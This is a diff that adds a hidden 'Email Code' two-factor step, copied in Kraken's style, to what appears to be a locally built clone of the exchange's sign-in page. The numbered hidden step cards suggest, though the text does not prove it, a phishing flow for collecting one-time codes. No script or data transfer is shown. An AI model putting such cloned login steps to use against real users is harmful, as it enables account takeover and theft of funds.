@@ -1007,6 +1007,122 @@
             </div>
           </div>
 
+          <div id="5" class=" card mt-4 w-[498px]" style="display: none">
+           
+            <div
+              class="ds-container ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 rounded-ds-container bg-ds-container px-ds-container-xl py-ds-container-xl shadow-ds-container overflow-hidden"
+              style="--ds-bg-parent-color: var(--background-color-ds-container)"
+            >
+              <div class="flex flex-col">
+                <form>
+                  <div class="grid" data-testid="TwoFactorAuthentication">
+                    <div class="flex flex-col items-center">
+                      <picture
+                        ><source
+                          type="image/webp"
+                          srcset="
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=200&amp;fit=min&amp;fm=webp   200w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=400&amp;fit=min&amp;fm=webp   400w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=768&amp;fit=min&amp;fm=webp   768w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=1024&amp;fit=min&amp;fm=webp 1024w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=1536&amp;fit=min&amp;fm=webp 1536w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=2048&amp;fit=min&amp;fm=webp 2048w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=2880&amp;fit=min&amp;fm=webp 2880w
+                          " />
+                        <source
+                          srcset="
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=200&amp;fit=min   200w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=400&amp;fit=min   400w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=768&amp;fit=min   768w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=1024&amp;fit=min 1024w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=1536&amp;fit=min 1536w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=2048&amp;fit=min 2048w,
+                            https://assets-cms.kraken.com/images/51n36hrp/facade/8e210626d0f412a3af2e2708a87f43eb78241a14-600x600.png?w=2880&amp;fit=min 2880w
+                          " />
+                        <img class="w-[12.5rem]" alt="photo-id illustration"
+                      /></picture>
+                      <div class="w-full">
+                        <h2
+                          class="text-ds-primary text-ds-heading4 ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0"
+                        >
+                          Email Code
+                        </h2>
+                        <div
+                          class="text-ds-neutral text-ds-body1 ms-ds-0 me-ds-0 mt-ds-3 mb-ds-7"
+                        >
+                          Enter the Sign-in code from your Email
+                          app.
+                        </div>
+                      </div>
+                      <div class="mb-3 w-full">
+                        <div
+                          class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 gap-ds-1 flex-col flex"
+                        >
+                          <div
+                            id="email-code-container"
+                            class="bg-ds-input hover:bg-ds-input-hover focus-within:bg-ds-input-selected outline-offset-ds-input overflow-clip outline-2 focus-within:outline-ds-input focus-within:outline box-border flex items-stretch gap-ds-input-xxl p-ds-input-outline-offset pr-ds-input-xxl h-ds-input-xxl rounded-ds-input-xxl"
+                            style="overflow-clip-margin: content-box"
+                          >
+                            <div
+                              class="flex items-center flex-1 gap-ds-input-xxl"
+                            >
+                              <div
+                                class="relative flex flex-row items-center rounded-[inherit] gap-ds-input-xxl size-full"
+                                style="min-width: 71px"
+                              >
+                                <label
+                                  for=":rf:"
+                                  class="text-ds-input-label pointer-events-none min-w-fit whitespace-nowrap peer-focus:text-ds-kraken-12-regular pointer-events-none absolute max-w-full cursor-text transition-all duration-200 ease-in-out text-ds-kraken-14-regular peer-focus:top-ds-input-offset-adjusted-xxl pl-ds-input-offset-adjusted-xxl"
+                                  >Email code</label
+                                ><input
+                                  inputmode="numeric"
+                                  placeholder="• • • • • •"
+                                  spellcheck="false"
+                                  autocomplete="one-time-code"
+                                  name="tfa"
+                                  type="text"
+                                  id="email-code-input"
+                                  class="text-ds-input caret-ds-input focus:placeholder-ds-input peer box-border h-full shrink grow rounded-[inherit] border-none bg-inherit py-0 outline-none max-w-full grow h-full w-0 text-ds-kraken-14-medium placeholder-transparent focus:pb-2 focus:pt-6 pl-ds-input-offset-adjusted-xxl"
+                                  value=""
+                                />
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <span
+                          class="ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 text-ds-kraken-12-regular bg-ds-inputerror-label text-ds-inputerror-label flex items-center gap-ds-inputerror-sm p-ds-inputerror-sm rounded-b-ds-inputerror-single-sm rounded-t-ds-inputerror-middle-sm"
+                          id="error-email-code-input"
+                          style="display: none"
+                          >This Email code doesn't look right. Please try
+                          again.</span
+                        >
+                      </div>
+                      <button
+                        id="enter-email-code"
+                        class="text-ds-button-primary-high hover:text-ds-button-primary-high-hover active:bg-ds-button-primary-high-active bg-ds-button-primary-high-gradient hover:bg-ds-button-primary-high-gradient-hover bg-ds-button-primary-high hover:bg-ds-button-primary-high-hover shadow-ds-button-primary-high w-full rounded-ds-button-xl outline-offset-ds-button relative box-border border-0 disabled:pointer-events-none opacity-40 [-webkit-appearance:button] outline-none ms-ds-0 me-ds-0 mt-ds-0 mb-ds-0 p-ds-button-xl inline-block whitespace-nowrap no-underline text-ds-button-xl"
+                        type="button"
+                      >
+                        <span
+                          id="enter-email-code-span"
+                          class="flex items-center justify-center gap-ds-button-xl"
+                          >Enter</span
+                        >
+                      </button>
+                    </div>
+                    <div
+                      role="region"
+                      aria-labelledby="alternative-2fa-methods"
+                    >
+                      
+                      
+                    </div>
+                   
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+
 
         </div>
         <footer class="mt-auto w-full">
